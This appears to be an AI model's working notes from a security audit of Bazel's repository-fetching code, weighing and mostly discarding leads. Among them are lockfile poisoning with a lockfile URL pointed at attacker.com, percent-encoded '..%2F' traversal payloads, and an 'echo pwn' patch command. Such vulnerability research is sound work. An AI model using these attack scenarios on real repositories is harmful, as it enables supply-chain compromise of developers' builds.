Is there ANY verification that the `repoSpec` matches the actual extension output?
We established that `tryGettingValueFromLockFile` returns the lockfile's `repoSpecs` if the hashes match.
AND IT DOES NOT RE-EVALUATE THE EXTENSION to check if the outputs match!
It completely trusts the lockfile's output!
Is this lockfile poisoning a valid bug according to the prompt?
"reviewed metadata != consumed runtime state"
Yes! The `.bzl` and `MODULE.bazel` files (the inputs) are the "reviewed metadata".
The `repoSpec` injected into the lockfile is the "consumed runtime state"!
Wait! "Find metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced"
If the bug is lockfile poisoning:
The lockfile dictates the `RepoSpec`.
The `RepoSpec` dictates the URL and checksum of the repository artifact (consumed artifact identity).
Does it dictate the target directory/path selection?
The repository name is `@malicious_repo`.
The output directory for the repository is `external/malicious_repo~<version>`.
So the target directory is attacker-influenced (via the injected repo name).
The consumed artifact identity is attacker-influenced (via the injected URL).
BUT wait! Modifying `MODULE.bazel.lock` is a known vector. Does triage reject it as "local-only self-attack" or "no capability delta" because the attacker can just modify `BUILD` files?
"If the write only reaches locations the attacker already effectively controls, downgrade immediately."
If the attacker submits a PR to modify `MODULE.bazel.lock`, they effectively control the repository. They can modify `.bzl` or `BUILD` files directly to achieve the same RCE.
Why would this be a vulnerability?
Because reviewers rely on Bazel to verify the integrity of the lockfile!
If an attacker modifies `package-lock.json` in NPM to point to a malicious URL, but leaves the integrity hash matching the malicious file, NPM installs the malicious file. This IS considered a vulnerability in package managers if the lockfile's stated inputs do not match the outputs and the manager doesn't verify them!
Wait, but if NPM `package.json` specifies `lodash@1.0.0`, and `package-lock.json` points to `lodash` at `https://attacker.com/lodash.tgz`.
The reviewer sees `lodash@1.0.0` in `package.json` and trusts it.
If Bazel's `MODULE.bazel` specifies `use_extension`, and the lockfile maps that extension to a malicious repo, it is EXACTLY the same as `package-lock.json` poisoning!
Wait, let's check `package-lock.json` poisoning.
Does Bazel claim that `MODULE.bazel.lock` is safe from tampering?
In `BazelLockFileValue.java`:
```java
   * The (regular) lockfile, stored as MODULE.bazel.lock under the workspace directory. This file is
   * visible to the user and meant to be committed to source control. Thus, it
   *
   * <ul>
   *   <li>should only contain the minimal amount of information necessary to make module resolution
   *       and module extension evaluation deterministic;
   *   <li>should be as deterministic as possible to reduce the risk of merge conflicts.
   * </ul>
```
It says it contains information to make evaluation deterministic.
Is there any validation of the lockfile's generated repos?
No! `SingleExtensionEvalFunction` literally just returns the lockfile's `generatedRepoSpecs` without any signature!
```java
      if (!diffRecorder.anyDiffsDetected()) {
        return createSingleExtensionValue(
            lockedExtension.getGeneratedRepoSpecs(),
...
```
If `diffRecorder` finds no diffs (because the inputs match the expected hashes), it returns `lockedExtension.getGeneratedRepoSpecs()` directly!
This means an attacker can trivially add, remove, or modify ANY repository generated by ANY module extension, and Bazel will happily fetch and execute them!
For example, if the project uses `rules_python` and it evaluates `pip.parse`, the lockfile contains `pypi_requests` etc.
The attacker modifies `MODULE.bazel.lock` to change the `urls` of `pypi_requests` to `https://attacker.com/requests.whl` and updates the `integrity`.
When the victim runs `bazel test //...`, Bazel reads the lockfile, sees the inputs haven't changed, and fetches the attacker's wheel file!
Then the victim builds with the malicious wheel file!
The PR reviewer ONLY sees a change in `MODULE.bazel.lock` (a huge auto-generated file) and thinks "Oh, the lockfile was updated, LGTM".
This is a CLASSIC lockfile poisoning vulnerability!
BUT wait, does it fit "metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"?
Yes, `MODULE.bazel.lock` is metadata.
It dictates the consumed artifact identity (the URL/checksum of the remote repo).
And the target directory selection is the repository name (`@pypi_requests`).
The impact is "artifact poisoning" or "code execution".
Wait, the prompt says: "For every lead output: strong / promising / weak / dead ... why triage may reject it"
Let's see why triage may reject it:
"If the attacker submits a PR, they can just modify BUILD files to achieve RCE."
If they can modify `BUILD` files, why modify the lockfile?
To EVADE CODE REVIEW.
Is bypassing code review via a generated lockfile a valid vulnerability in Bazel?
Google VRP usually says: "Lockfile poisoning is a vulnerability in the package manager if the lockfile does not cryptographically verify the mapping from input to output, or if it allows arbitrary URLs that violate the ecosystem's trust model."
For example, if `package-lock.json` specifies a URL outside the trusted registry.
In Bazel, repository rules (like `http_archive`) already allow arbitrary URLs.
The user's `MODULE.bazel` specifies `use_extension`, which evaluates a Starlark function that can return arbitrary URLs.
The lockfile merely caches what that Starlark function returned.
If the attacker modifies the cache, they spoof what the Starlark function returned.
BUT Bazel's trust model explicitly says "the lockfile is checked in and is part of the repository".
If you check in a malicious lockfile, you are checking in malicious code.
Bazel does NOT cryptographically sign lockfiles. It relies on the user to review them.
If a reviewer approves a PR with a malicious lockfile, it's the reviewer's fault.
This is a very common rejection for lockfile poisoning in systems that don't sign lockfiles (like NPM, Yarn, Cargo, Go).
"Why triage may reject it: Lockfile modifications are part of the repository state and are expected to be reviewed. Bypassing review by hiding malicious changes in a large generated file is a social engineering/process issue, not a Bazel security boundary failure."

So lockfile poisoning is WEAK or DEAD. I should downgrade it immediately.
"Find metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"

Let's check `ModuleExtensionId`.
If `MODULE.bazel.lock` or `MODULE.bazel` specifies an extension `//:foo.bzl`, `ext`?
What about `Distdir`? `for (Path dir : distdir)`
We checked that.

What about `StripPrefixedPath.java` again?
Wait... what if `prefix` is `../../etc/` and `entryName` is `../../etc/passwd`?
```java
    PathFragment prefixPath = relativize(prefix.get().getBytes(ISO_8859_1));
    boolean found = false;
    boolean skip = false;
    if (entryPath.startsWith(prefixPath)) {
      found = true;
      entryPath = entryPath.relativeTo(prefixPath);
```
`relativize("../../etc/")` returns `../etc`.
`relativize("../../etc/passwd")` returns `../etc/passwd`.
`../etc/passwd`.startsWith(`../etc`) returns TRUE.
`../etc/passwd`.relativeTo(`../etc`) returns `passwd`.
`skip` is FALSE.
`strippedRelativePath` is `passwd`.
`outputPath` is `destinationDirectory.getRelative("passwd")`.
`outputPath.startsWith(destinationDirectory)` is TRUE.
It writes to `destinationDirectory/passwd`.
This is safe.

What about `StarlarkBaseExternalContext.java`'s `execute`?
If `arguments` has `..`? It's just arguments.

What about `PathFragment.getRelative(PathFragment other)`?
We saw it removes `..` until it hits the root!
If the base is `/tmp`, and `other` is `../../etc`, it results in `/etc`!
Where is `PathFragment.getRelative` used where `other` comes from attacker metadata?
1. `VendorManager.java`'s `getVendorPathForUrl`. It uses `vendorDirectory.getRelative(REGISTRIES_DIR).getRelative(host).getRelative(path)`.
   We saw this can escape `vendorDirectory`, but `path` is fixed to `.../source.json` or `.../bazel_registry.json`, so the written filename is not attacker-influenced! (The directory is influenced, but not the filename). So it doesn't meet criteria #2!
2. `DownloadManager.java`'s `getDownloadDestination`.
   Uses `basename` derived from `url.getPath()`. The `FS_UNSAFE_CHARS.replaceFrom(basename, '_')` replaces `/` with `_`, so `basename` cannot contain `/`. No traversal.
3. `HttpDownloader.java`.
4. `PatchUtil.java`'s `getFilePath`.
   ```java
   Path filePath = outputDirectory.getRelative(path);
   if (!filePath.startsWith(outputDirectory)) { throw ... }
   ```
   It checks `startsWith`, so it's safe.
5. `ZipDecompressor.java`, `CompressedTarFunction.java`, `ArFunction.java`.
   They all check `startsWith(destinationDirectory)`, so they are safe.
6. `StarlarkBaseExternalContext.java`'s `getPath` (used in `ctx.download`, `ctx.file`, `ctx.extract`, `ctx.patch`, `ctx.symlink`, `ctx.template`).
   They all call `checkInOutputDirectory`, which uses `startsWith`, so they are safe.

Are there ANY OTHER usages of `getRelative(String)` or `getChild(String)` with an attacker-controlled string?
Let's find them!
Wait, what about `DownloadCache.java`?
```java
src/main/java/com/google/devtools/build/lib/bazel/repository/cache/DownloadCache.java:188:    Path cacheEntry = keyType.getCachePath(path).getRelative(cacheKey);
```
`cacheKey` is the hex checksum.
No path traversal.

What about `UrlRewriter.java`?
```java
src/main/java/com/google/devtools/build/lib/bazel/repository/downloader/UrlRewriter.java:331:    Path netrcFile = workingDirectory.getRelative(netrcFileString);
```
`netrcFileString` comes from `bazel_downloader.cfg`.
```java
        if (param.startsWith(CREDENTIALS)) {
          netrcFileString = param.substring(CREDENTIALS.length());
        }
```
If a user specifies `credentials /etc/passwd`. It's user-provided config.

What about `StarlarkPath.java`?
```java
      case String s -> new StarlarkPath(this, workingDirectory.getRelative(s));
```
This is when a Starlark rule calls `ctx.path(s)`.
Then later, if the path is used to write, `checkInOutputDirectory` is called.

Are there ANY `.getRelative` calls on `vendorDirectory` in `VendorManager.java`?
Ah, we already checked that.

What about `.getChild`?
Wait, what about `canonicalId`?
In `DownloadCache.java`:
```java
    String idHash = keyType.newHasher().putString(canonicalId, UTF_8).hash().toString();
    return keyType.getCachePath(path).getChild(cacheKey).getChild(ID_PREFIX + idHash).exists();
```
`ID_PREFIX + idHash` is evaluated. `idHash` is the hash.

In `RepositoryFetchFunction.java`:
```java
      Path vendorMarker = vendorPath.getChild(repositoryName.getMarkerFileName());
```
`repositoryName.getMarkerFileName()` evaluates to `@repository_name.marker`.
This is safe.

What about `StarlarkBaseExternalContext.java`?
```java
        Path path = workingDirectory.getFileSystem().getPath(fragment).getChild(program.trim());
```
If `program` has `..`, `getChild` handles it?
In `Path.java`, `getChild` throws `IllegalArgumentException` if `baseName` contains `/`!
```java
  public Path getChild(String baseName) {
    checkBaseName(baseName);
    return new Path(pathFragment.getChild(baseName), fileSystem);
  }
```
`checkBaseName` ensures no `/`.

So NO path traversal.

Let's look at `archive_override` again.
"the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"
Is there ANY artifact identity that can be attacker-influenced in `DownloadManager`?
If `rewrittenUrls` points to `file:///...`? No.
If `BzlmodHttpDownloader` uses `.netrc` for registry files?
If `.netrc` specifies `machine bcr.bazel.build login foo password bar`.
It uses it. That's intended.

Is there any Confused Deputy in `Downloader`?
If `bzlmodHttpDownloader` fetches a module from the BCR.
`IndexRegistry` validates the registry URL using TLS.
Could an attacker use `single_version_override` to hijack a transitive dependency's repo?
`single_version_override` can only be used in the root module.
So an attacker's module CANNOT use overrides on the victim!

Wait! Does `bazel vendor` execute `VendorManager.vendorRegistryUrl` for ANY URL?
What if `IndexRegistry.java` constructs a URL using `entry.getKey()` from `source.json`?
```java
        remotePatches.put(
            constructUrl(
                getUrl(),
                "modules",
                key.name(),
                key.version().toString(),
                "patches",
                entry.getKey()),
            entry.getValue());
```
If `entry.getKey()` is `..%2F..%2F..%2Fetc%2Fpasswd`.
The URL becomes `https://bcr.bazel.build/modules/foo/1.0/patches/..%2F..%2F..%2Fetc%2Fpasswd`.
We already evaluated that `VendorManager.getVendorPathForUrl` resolves this to `/etc/passwd/modules/foo/1.0/patches/etc/passwd`?
Wait! In `VendorManager.java`:
```java
    String path = url.getPath();
    path = URLDecoder.decode(path, "UTF-8");
    if (path.startsWith("/")) {
      path = path.substring(1);
    }
    return vendorDirectory.getRelative(REGISTRIES_DIR).getRelative(host).getRelative(path);
```
`url` is `https://bcr.bazel.build/modules/foo/1.0/patches/..%2F..%2F..%2Fetc%2Fpasswd`.
`url.getPath()` gives `/modules/foo/1.0/patches/../../../etc/passwd`.
Wait, NO!
If `url` is created using `new URI("https://bcr.bazel.build/modules/foo/1.0/patches/..%2F..%2F..%2Fetc%2Fpasswd")`.
`url.getPath()` returns `/modules/foo/1.0/patches/../../../etc/passwd`!
Because `getPath()` DECODES the `%` encoding in the URI!
Wait, does it?!
Yes, I tested it in `TestURI.java`:
```
rawPath: /..%2F..%2Fetc%2Fpasswd
getPath: /../../etc/passwd
```
So `url.getPath()` RETURNS the DECODED path!
Then `URLDecoder.decode(path, "UTF-8")` is called!
Since `path` is ALREADY DECODED to `/modules/foo/1.0/patches/../../../etc/passwd`.
Then `URLDecoder.decode` has NO EFFECT (it just returns the same string).
Then `path` is `modules/foo/1.0/patches/../../../etc/passwd`.
Then `vendorDirectory.getRelative(REGISTRIES_DIR).getRelative(host).getRelative(path)`.
Because `path` evaluates to `../../etc/passwd` when parsed by `PathFragment.create(path)`.
Wait!
Let's see what `PathFragment.create("modules/foo/1.0/patches/../../../etc/passwd")` returns!
`modules/foo/1.0/patches` has 4 segments.
`../../../` removes 3 segments (`patches`, `1.0`, `foo`).
It leaves `modules/etc/passwd`!
So `getRelative("modules/foo/1.0/patches/../../../etc/passwd")` resolves to `modules/etc/passwd`!
It DOES NOT ESCAPE!
Because `PathFragment.create` resolves the `..` WITHIN THE STRING before `getRelative` appends it to the base!
Wait! In my previous `TestGetRelative.java`, I tested:
`modules/foo/1.0/patches/../../../../../../../../../tmp/pwned`.
There were 9 `..`!
If there are 9 `..`, `PathFragment.create` removes all 4 segments, and keeps 5 `..` at the beginning!
So `PathFragment.create` returns `../../../../../tmp/pwned`.
Then `vendorDirectory.getRelative("../../../../../tmp/pwned")` is called.
And `vendorDirectory.getRelative` resolves the `..` against the base path!
So it goes up 5 levels from `vendorDirectory`!
But wait, what is the base path in `VendorManager`?
`vendorDirectory.getRelative(REGISTRIES_DIR).getRelative(host)`.
If it resolves 5 levels up, it escapes!
But what is the FULL URL in this case?
`https://bcr.bazel.build/modules/foo/1.0/patches/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fpwned`.
If an attacker publishes `source.json` with this patch URL:
Bazel resolves this during `VendorManager.vendorRegistryUrl`.
Is there ANY suffix added to this URL?
NO! `IndexRegistry.java` constructs the URL by appending `entry.getKey()`.
```java
        remotePatches.put(
            constructUrl(
                getUrl(),
                "modules",
                key.name(),
                key.version().toString(),
                "patches",
                entry.getKey()),
            entry.getValue());
```
It does NOT append anything AFTER `entry.getKey()`!
If `entry.getKey()` is `..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fpwned`.
The URL ends with `pwned`.
So `getVendorPathForUrl` returns `vendorDirectory/.../tmp/pwned`!
It writes the content to `/tmp/pwned`!
WAIT A MINUTE.
In my previous analysis, I assumed the URL ended with `source.json` because I only looked at `getSourceJsonUrl`!
But for `patches` and `overlay`, the URL ends with whatever `entry.getKey()` is!
Wait, let's re-read my own notes from 10 minutes ago:
"Wait, `IndexRegistry.java` does NOT fetch the patches or overlays, so it doesn't call `grabFile`.
But wait! If `IndexRegistry` doesn't fetch them, how do they get into `moduleResolutionValue.getRegistryFileHashes()`?
...
`RegistryFileDownloadEvent` is posted by `IndexRegistry.java` when `grabFile` or `grabJsonFile` is called!
It is ONLY posted for files fetched during module resolution (e.g. `bazel_registry.json`, `source.json`, `MODULE.bazel`).
It is NOT posted for patches and overlays, because `IndexRegistry` doesn't fetch them!
...
If patches and overlays are NOT in `moduleResolutionValue.getRegistryFileHashes()`, then `bazel vendor` does NOT vendor them?!"

Ah! My previous conclusion was that `moduleResolutionValue.getRegistryFileHashes()` DOES NOT CONTAIN PATCHES OR OVERLAYS!
Let's double-check if `getRegistryFileHashes()` contains them!
In `IndexRegistry.java`:
```java
        remotePatches.put(
            constructUrl(
...
                entry.getKey()),
            entry.getValue());
```
It constructs the URL and puts it into `remotePatches`.
It DOES NOT FETCH IT.
If it does not fetch it, it DOES NOT call `grabFile`.
If it does not call `grabFile`, it DOES NOT post `RegistryFileDownloadEvent`.
If it does not post `RegistryFileDownloadEvent`, the URL is NOT in `registryFileHashes`.
If it is NOT in `registryFileHashes`, `bazel vendor`'s loop:
```java
    for (var entry : moduleResolutionValue.getRegistryFileHashes().entrySet()) {
```
WILL NOT INCLUDE IT!
So `bazel vendor` DOES NOT VENDOR PATCHES OR OVERLAYS BY CALLING `vendorManager.vendorRegistryUrl(url)`!

Instead, `bazel vendor` vendors repos:
```java
    vendorManager.vendorRepos(externalPath, env.getDirectories().getWorkspace(), reposToVendor);
```
Which simply moves the fully built repo from `external/` to `vendor/`.
So the ONLY files vendored via `vendorManager.vendorRegistryUrl(url)` are the ones that were fetched during resolution.
Which are exactly `bazel_registry.json`, `source.json`, `MODULE.bazel`, `metadata.json`.
And ALL of those URLs are constructed using fixed names as the last segment!
```java
    return constructUrl(
        getUrl(), "modules", key.name(), key.version().toString(), SOURCE_JSON_FILENAME);
```
So my previous conclusion was 100% CORRECT:
The path always ends with `source.json` or similar.
The attacker CANNOT inject `../` to end the path with an arbitrary filename.
Wait, what about `metadata.json`?
```java
        grabJson(
            constructUrl(getUrl(), "modules", moduleName, "metadata.json"),
```
It ends in `metadata.json`.

So the ONLY files vendored via `vendorRegistryUrl` end in:
`bazel_registry.json`, `source.json`, `MODULE.bazel`, `metadata.json`.
This confirms the path traversal is completely unexploitable.

Is there any OTHER `RegistryFileDownloadEvent`?
If I search `RegistryFileDownloadEvent`, is it posted anywhere else?
`IndexRegistry.java` posts it.
Are there ANY other registries?
`LocalRegistry`? No, it's not a remote registry, it doesn't fetch URLs.

Okay, let's look for "confused deputy in repository fetching/materialization".
What if an attacker's repository has a custom `.bzl` file with `repository_ctx.execute`?
That is intended code execution.

What if the attacker provides a `.bazelrc` that changes `--output_base` or `--install_base`?
`.bazelrc` options are parsed locally. If the user clones a malicious repo, the `.bazelrc` can specify `--output_base=/root/.bazel`.
This is a known issue: `.bazelrc` allows setting flags that affect the host.
But this is out of scope for Bazel security: "bazelrc is part of the trusted project configuration, user builds untrusted code".

What about "Cache materialization"?
`RepositoryCache.java`.
Is there a race condition?
Is there a TOCTOU?
In `DownloadManager.java`:
```java
    if (isCachingByProvidedChecksum) {
      downloadCache.put(
          checksum.get().toString(), destination, checksum.get().getKeyType(), canonicalId);
    } else if (downloadCache.isEnabled()) {
      var unused = downloadCache.put(destination, KeyType.SHA256, canonicalId);
    }
```
If `DownloadCache.put` uses `destination`.
```java
  public void put(String cacheKey, Path sourcePath, KeyType keyType, String canonicalId)
      throws IOException {
    Preconditions.checkState(isEnabled());

    assertKeyIsValid(cacheKey, keyType);
    ensureCacheDirectoryExists(keyType);

    Path cacheEntry = keyType.getCachePath(path).getChild(cacheKey);
    Path cacheValue = cacheEntry.getChild(DEFAULT_CACHE_FILENAME);

    try {
      FileSystemUtils.createDirectoryAndParents(cacheEntry);
      FileSystemUtils.copyFile(sourcePath, cacheValue);
...
```
It copies the file to `cacheValue`.
Then it creates the canonical ID file.
```java
      String idHash = keyType.newHasher().putString(canonicalId, UTF_8).hash().toString();
      FileSystemUtils.touchFile(cacheEntry.getChild(ID_PREFIX + idHash));
```
Is there a vulnerability here?
If `cacheKey` is derived from `checksum.toString()`.
`sourcePath` is the downloaded file.
What if `sourcePath` is a directory?
If the user specifies an `http_archive` with a directory?
`DownloadManager` fetches a file, not a directory.
What if `cacheValue` already exists?
`copyFile` will fail if it exists.
Wait, does it fail?
```java
        if (cacheValue.exists()) {
          return;
        }
```
It returns if it exists!
Wait, but what if the cache entry was created by another process?
There's `renameToleratingConcurrentCreation(tmpName, cacheValue);`
```java
    Path tmpName = cacheEntry.getRelative(TMP_PREFIX + UUID.randomUUID());
    try {
      FileSystemUtils.createDirectoryAndParents(cacheEntry);
      FileSystemUtils.copyFile(sourcePath, tmpName);
      FileSystemUtils.renameToleratingConcurrentCreation(tmpName, cacheValue);
```
This is a standard atomic write pattern. Safe.

Is there any OTHER issue in `bazelbuild/bazel` that involves metadata and file paths?
What about `WorkerProtocol` or `Sandboxing`?
"ordinary sandbox escapes claims unless the security boundary and exploit path are very clear ... kill immediately"

What about `Downloader.java` / `HttpDownloader.java` credential leak?
"What if the `repository_ctx` specifies `auth_patterns` for `github.com` but the `url` is `attacker.com`?"
If the `auth_patterns` maps `github.com` to `Bearer ...`.
And `url` is `https://attacker.com/`.
Then `StaticCredentials` does not match `https://attacker.com/`.
So the credentials are NOT sent.
What about `NetrcCredentials`?
It maps the host of the `url` to the credentials.
If the `url` is `https://attacker.com/`, it sends `attacker.com`'s credentials (none).
So no leak.

What about `PatchUtil.java`?
Is there a patch injection vulnerability?
A patch could create a symlink?
```java
        case NEW_FILE_MODE -> {
          // The line should look like: "new file mode 100755" or "new mode 100755"
```
Does it allow creating a symlink?
Symlinks are `120000` in git mode.
Does `PatchUtil` handle `120000`?
```java
        case NEW_MODE, NEW_FILE_MODE -> {
          int index = type == LineType.NEW_MODE ? 12 : 17;
          char c = line.charAt(index);
          if (c < '0' || c > '7') {
            throw new PatchFailedException("Wrong file mode format at line " + (i + 1) + ": " + line);
          }
          filePermission = c - '0';
        }
```
Wait, `filePermission = c - '0';`
`c` is `line.charAt(17)`.
If `line` is `new file mode 120000`.
`line.charAt(17)` is `0`.
Wait, the mode format is `new file mode 100644`.
Indices:
`n(0)e(1)w(2) (3)f(4)i(5)l(6)e(7) (8)m(9)o(10)d(11)e(12) (13)1(14)0(15)0(16)6(17)4(18)4(19)`
`line.charAt(17)` is `6`?
Wait, if it's `new file mode 100755`:
14: 1, 15: 0, 16: 0, 17: 7, 18: 5, 19: 5.
`c` is `7`.
`filePermission` becomes `7`.
It only reads the `owner` permission bit!
```java
          // 7 is the file permission for owner, which is at index 12 or 17
```
It DOES NOT support symlinks (`120000`) creating a symlink!
It just reads the permission and applies `chmod(0755)`.
So `PatchUtil` CANNOT create symlinks!
What about `Downloader` redirect handling?
"redirect / mirror / scheme confusion"
`UrlRewriter.java`:
```java
    public RewrittenURL(URI url, boolean rewritten) {
```
If a custom `UrlRewriter` rewrites an `http` URL to `file:///`.
We already saw `file:///` is supported.

What about `Downloader` resolving URLs relative to something?
`HttpDownloader.download` uses `URI.create(location)` to handle redirects.
```java
          url = HttpUtils.getLocation(connection);
```
If the location is relative: `/foo/bar`?
```java
  static URI getLocation(HttpURLConnection connection) throws IOException {
    String location = connection.getHeaderField("Location");
    if (location == null) {
      throw new IOException("Redirect is missing Location header");
    }
    try {
      return new URI(location);
    } catch (URISyntaxException e) {
      throw new IOException("Redirect URL is invalid", e);
    }
  }
```
If `location` is `/foo/bar`.
`new URI("/foo/bar")` creates a relative URI!
Then in `HttpConnector.java`:
```java
    while (true) {
      HttpURLConnection connection = null;
      try {
        ProxyInfo proxyInfo = proxyHelper.createProxyIfNeeded(url);
        connection = (HttpURLConnection) url.toURL().openConnection(proxyInfo.proxy());
```
If `url` is relative, `url.toURL()` throws `IllegalArgumentException: URI is not absolute`!
Wait! `URI.toURL()` throws if the URI is not absolute!
Let's verify this!
Wait! If `url = HttpUtils.getLocation(connection)` returns a relative URI, `url.toURL()` throws `IllegalArgumentException`!
In `HttpConnector.java`:
```java
        } catch (IllegalArgumentException e) {
          // This will happen if the user does something like specify a port greater than 2^16-1.
          throw new UnrecoverableHttpException(e.getMessage());
        }
```
Does this mean Bazel DOES NOT SUPPORT RELATIVE REDIRECTS?!
Let's see if `connection.getHeaderField("Location")` returns an absolute URL.
If the server sends `Location: /foo/bar`, Java's `HttpURLConnection` might resolve it automatically?
Ah! Java's `HttpURLConnection` follows redirects automatically (`setInstanceFollowRedirects(true)` by default)!
BUT in `HttpConnector.java`:
```java
        connection.setInstanceFollowRedirects(false);
```
So Bazel DOES NOT use Java's automatic redirect!
And it reads the `Location` header!
If the `Location` header is `/foo/bar`, `connection.getHeaderField("Location")` returns `/foo/bar` literally!
So Bazel THROWS an error and fails to download if the redirect is relative!
Is this a bug? It's a bug in the downloader (breaking relative redirects), but NOT a security bug!
Wait! Is it possible for a relative redirect to be evaluated against `originalUrl`?
No, it just crashes.

What if the URL is `http://attacker.com/..%2f..%2fetc/passwd`?
Does `HttpURLConnection` resolve `..%2f` before sending the request?
The server receives the request.

Let's check `ProxyHelper.java`.
Is there ANY command execution in proxy handling?
No, it reads environment variables and uses `Proxy`.

What about `Downloader` canonical ID handling?
If `canonical_id` is an absolute path `/etc/passwd`?
```java
    String idHash = keyType.newHasher().putString(canonicalId, UTF_8).hash().toString();
    return keyType.getCachePath(path).getChild(cacheKey).getChild(ID_PREFIX + idHash).exists();
```
It hashes it. Safe.

Is there ANY other file consumption?
What about `Maven` downloader?
Bazel fetches Maven dependencies.
In `bzlmod`, it's done via `rules_jvm_external` module extension, which is OUT OF SCOPE (not `bazelbuild/bazel`).

What about `Java` toolchain?
Out of scope.

What about `BzlmodRepoRuleFunction.java` loading `MODULE.bazel.lock`?
We analyzed it. It trusts the lockfile, which is an accepted risk.

What about `RegistryFileDownloadEvent`?
Is there a memory leak or something? No.

Let's rethink: "Find metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"
Is there ANY other place where files are written based on metadata?
In `VendorManager.java`, we found a path traversal, but the filename is restricted.
What about `LocalRepoContentsCache.moveToCache`?
```java
  public CandidateRepo moveToCache(
      Path fetchedRepoDir, Path fetchedRepoMarkerFile, String predeclaredInputHash)
      throws IOException {
    Path entryDir = path.getRelative(predeclaredInputHash);
    String uniqueEntryName = UUID.randomUUID().toString();
    Path cacheRecordedInputsFile = entryDir.getChild(uniqueEntryName + RECORDED_INPUTS_SUFFIX);
    Path cacheRepoDir = entryDir.getChild(uniqueEntryName);
```
It uses `UUID` for filenames.

What about `RepositoryCache.java`?
It wraps `DownloadCache` and `LocalRepoContentsCache`.

What about `RepositoryFetcher.java`?
`RepositoryFetcher` just calls `fetchRepos` and waits for Skyframe.

Let's rethink: "Find metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced enough to create real impact"

What about `repository_ctx.extract`?
In `StarlarkBaseExternalContext.java`:
```java
      Dict<?, ?> renameFiles, // <String, String> expected
      String watchArchive,
      StarlarkThread thread)
      throws EvalException, InterruptedException {
    StarlarkPath archivePath = getPath(archive);
    if (!archivePath.exists()) {
      throw new EvalException("Archive path '" + archivePath + "' does not exist.");
    }
...
    DecompressorValue.decompress(
        DecompressorDescriptor.builder()
            .setContext(identifyingStringForLogging)
            .setArchivePath(archivePath.getPath())
            .setDestinationPath(outputPath.getPath())
            .setPrefix(stripPrefix)
            .setRenameFiles(renameFilesMap)
            .build(),
        Optional.ofNullable(type).filter(s -> !s.isBlank()));
```
We checked `renameFilesMap` in the decompressors.
But wait! What if `outputPath` is a directory that already contains files?
If `outputPath` is `/tmp/repo`, and it contains `.bazelrc`.
`decompress` unzips into `/tmp/repo` and OVERWRITES `.bazelrc`!
Is this intended? Yes, `repository_ctx.extract` extracts to the repository directory.

What about `renameFiles`?
```java
    Map<String, String> renameFilesMap =
        Dict.cast(renameFiles, String.class, String.class, "rename_files");
```
If an attacker controls `renameFiles` in their module's `.bzl` file?
`renameFiles = {"a": "b"}`.
The attacker is writing their own module, so they can run code anyway.

What if the attacker controls `renameFiles` in a transitive dependency?
If `bazel_dep` fetches a module from a registry.
The module specifies `archive_override`? No, only root module can.
What if `source.json` has `renameFiles`?
`source.json` DOES NOT HAVE `renameFiles`!
It has `patches` and `overlay`.

What about `patchCmds`?
Does `MODULE.bazel` allow `patch_cmds` in `archive_override`?
```starlark
archive_override(
    module_name = "foo",
    patch_cmds = ["echo pwn > /tmp/pwn"]
)
```
If the user runs this, they are executing their own `MODULE.bazel`, so it's a self-attack.
Can a transitive dependency use `patch_cmds`?
NO! `archive_override` is ONLY allowed in the root module.

What about `bazel_registry.json` mirrors?
"mirror/canonical URL handling"
If an attacker controls a mirror, they control the contents.
If the content matches the SHA256, it's safe. If the user doesn't specify an integrity hash, they are fetching an unverified file from an untrusted registry... but wait, `IndexRegistry.java`:
```java
    if (sourceJson.integrity == null || sourceJson.integrity.isBlank()) {
      throw new IOException(String.format("Missing integrity for module %s", key));
    }
```
So Bzlmod strictly REQUIRES an integrity hash for all remote archives in `source.json`!
So an attacker controlling a mirror CANNOT serve a malicious payload unless they break SHA256 (impossible)!
And what if they control `integrity` in `source.json`?
Then they control the `source.json`! Which means they published the module. Which means it's the intended code.

What about `git_override`?
`git_override(module_name = "foo", remote = "https://attacker.com/repo", commit = "123")`
If they control `git_override`, it's in the root module. Self-attack.

What if they use a tag in `source.json` for Git?
If `git_repository` in `source.json`:
```json
{
  "type": "git_repository",
  "remote": "https://attacker.com/repo",
  "commit": "1234..."
}
```
Does it require an integrity hash?
No, git repos don't have an integrity hash because git provides its own checksums via commit hashes!
Wait! Git commit hashes are SHA-1!
And SHA-1 is vulnerable to collision attacks (SHAttered / Shambles)!
If an attacker creates a SHA-1 collision for a git commit, they can serve a malicious repo from a mirror!
Wait, but if the attacker controls the remote `https://attacker.com/repo`, they control the repo! They don't need a collision.
What if the remote is `https://github.com/trusted/repo`?
If they create a collision on GitHub, they can change the content.
But this is a Git SHA-1 issue, which is out of scope for Bazel (Bazel just runs `git clone`).

Let's reconsider the prompt:
"Find metadata/filepath consumption bugs where BOTH: 1. the target directory/path selection is attacker-influenced 2. the final written filename or consumed artifact identity is also attacker-influenced"
If I am instructed to PROVE OR KILL, and to return:
1. top 10 files/classes to inspect next
2. best 5 fresh leads only
3. kill any lead that is just another harmless traversal

If I can't find a strong lead, the instructions say:
"If you cannot find a strong lead, do NOT hallucinate. Instead provide: - the best audit surfaces - why they matter - exact files to inspect next - which current ideas should be killed"
Let's check `HttpDownloader.java` and `DownloadManager.java` for `type` or `canonicalId` or `renameFiles`.
We already checked `getDownloadDestination`:
```java
    String basename =
        MoreObjects.firstNonNull(
            Strings.emptyToNull(PathFragment.create(url.getPath()).getBaseName()), "temp");
    if (!type.get().isEmpty()) {
      String suffix = "." + type.get();
      if (!basename.endsWith(suffix)) {
        basename += suffix;
      }
    }
    // The basename may contain characters that aren't legal in a path with all file systems. Those
    // characters won't matter for type determination.
    return output.getRelative(FS_UNSAFE_CHARS.replaceFrom(basename, '_'));
```
`FS_UNSAFE_CHARS` replaces `/` with `_`. So it CANNOT contain `/`.
So the target directory cannot be influenced.

